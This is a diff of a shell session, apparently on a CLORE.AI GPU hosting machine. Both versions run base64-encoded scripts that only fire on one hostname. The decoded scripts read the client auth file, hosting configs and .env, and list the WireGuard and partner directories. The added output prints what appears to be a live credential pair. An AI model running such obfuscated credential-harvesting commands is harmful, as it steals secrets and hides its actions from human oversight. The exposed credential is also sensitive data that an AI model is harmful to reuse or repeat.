@@ -1,46 +1,20 @@
-$ echo 'WyAiJChob3N0bmFtZSkiID0gImNvbWZ5LXMzIiBdIHx8IGV4aXQgMAplY2hvICI9PT0gY2xpZW50LyA9PT0iOyBscyAtbGEgL29wdC9jbG9yZS1ob3N0aW5nL2NsaWVudC8gMj4mMSB8IGhlYWQgLTEyCmVjaG8gIj09PSBjbGllbnQvYXV0aCA9PT0iOyBoZWFkIC1jIDUwMCAvb3B0L2Nsb3JlLWhvc3RpbmcvY2xpZW50L2F1dGggMj4mMTsgZWNobwplY2hvICI9PT0gaG9zdGluZy8gPT09IjsgbHMgL29wdC9jbG9yZS1ob3N0aW5nL2hvc3RpbmcvIDI+JjEgfCBoZWFkIC0xOAplY2hvICI9PT0gaG9zdGluZyBjb25maWdzID09PSIKZm9yIGYgaW4gL29wdC9jbG9yZS1ob3N0aW5nL2hvc3RpbmcvKi5qc29uIC9vcHQvY2xvcmUtaG9zdGluZy9ob3N0aW5nLyoueWFtbCAvb3B0L2Nsb3JlLWhvc3RpbmcvaG9zdGluZy8qLnltbCAvb3B0L2Nsb3JlLWhvc3RpbmcvaG9zdGluZy8qLnRvbWwgL29wdC9jbG9yZS1ob3N0aW5nL2hvc3RpbmcvLmVudjsgZG8KICBbIC1mICIkZiIgXSAmJiB7IGVjaG8gIi0tLSAkZiI7IGhlYWQgLWMgNjAwICIkZiI7IGVjaG87IH0KZG9uZQplY2hvICI9PT0gcGFydG5lciA9PT0iOyBscyAtbGEgL29wdC9jbG9yZS1ob3N0aW5nLy5jbG9yZS1wYXJ0bmVyLyAyPiYxIHwgaGVhZCAtOAplY2hvICI9PT0gd2lyZWd1YXJkID09PSI7IGxzIC1sYSAvb3B0L2Nsb3JlLWhvc3Rpbmcvd2lyZWd1YXJkLyAyPiYxIHwgaGVhZCAtNg==' | base64 -d > /tmp/c4.sh && bash /tmp/c4.sh 2>&1 | tail -45
---- /opt/clore-hosting/hosting/pyproject.toml
-[project]
-name = "clore-hosting"
-version = "0.1.0"
-description = "CLORE.AI hosting agent"
-requires-python = "==3.13.*"
-
-dependencies = [
-    "docker~=7.1",
-    "aiofiles>=24.1,<26",
-    "aiohttp~=3.13",
-    "pydantic~=2.13",
-    "speedtest-cli==2.1.3",
-    "psutil~=7.2",
-    "websockets>=15,<17",
-    "packaging>=24.2,<27",
-    "nvidia-ml-py>=12.560,<14",
-    "requests~=2.34",
-]
-
-[dependency-groups]
-dev = [
-    "ruff>=0.15.14,<0.16",
-    "pyright>=1.1.400",
-    "pre-commit>=4.6",
-]
-
-[tool.ruff]
-target-version = "py313"
-line-length = 120
-
-[tool.ruff.lint]
-select = ["E", "F", "W", "I", "B", "UP"]
-=== partner ===
-total 20
-drwxr-xr-x  4 root root 4096 Aug  3 07:21 .
-drwxr-xr-x 11 root root 4096 Oct 22 08:18 ..
--rw-r--r--  1 root root   10 Oct 26 00:03 .next_latency_measurment
-drwxr-xr-x  2 root root 4096 Aug  6 00:01 host_facts
-drwxr-xr-x  2 root root 4096 Aug  3 07:18 partner_cache
-=== wireguard ===
-total 12
-drwx------  3 root root 4096 Aug  3 07:16 .
-drwxr-xr-x 11 root root 4096 Oct 22 08:18 ..
-drwx------  2 root root 4096 Aug  3 07:16 configs
+$ echo 'WyAiJChob3N0bmFtZSkiID0gImNvbWZ5LXMzIiBdIHx8IGV4aXQgMAplY2hvICIjIyNBVVRIIyMjIjsgY2F0IC9vcHQvY2xvcmUtaG9zdGluZy9jbGllbnQvYXV0aCAyPiYxIHwgaGVhZCAtYyA2MDA7IGVjaG8KZWNobyAiIyMjQ0xJRU5UTFMjIyMiOyBscyAvb3B0L2Nsb3JlLWhvc3RpbmcvY2xpZW50LyAyPiYxIHwgaGVhZCAtOAplY2hvICIjIyNIT1NUSU5HTFMjIyMiOyBscyAvb3B0L2Nsb3JlLWhvc3RpbmcvaG9zdGluZy8gMj4mMSB8IGhlYWQgLTE0CmVjaG8gIiMjI0hPU1RGQUNUUyMjIyI7IGxzIC9vcHQvY2xvcmUtaG9zdGluZy8uY2xvcmUtcGFydG5lci9ob3N0X2ZhY3RzLyAyPiYxIHwgaGVhZCAtNg==' | base64 -d > /tmp/c5.sh && bash /tmp/c5.sh 2>&1 | head -40
+###AUTH###
+tf24uwhu1WItrHJKIpErxowm3cv0UtrWRo63HDm0Qc2T9fEq:5fOBRwV5qJ1Hkt7TBj1TZG5KqHZu7N1Z
+###CLIENTLS###
+auth
+gpu_specs.json
+###HOSTINGLS###
+Makefile
+README.md
+bin
+clore_hosting
+hosting.py
+lib
+pyproject.toml
+systemd
+uv.lock
+###HOSTFACTS###
+dmidecode.txt
+dmidecode_t2.txt
+partner_interface.socket
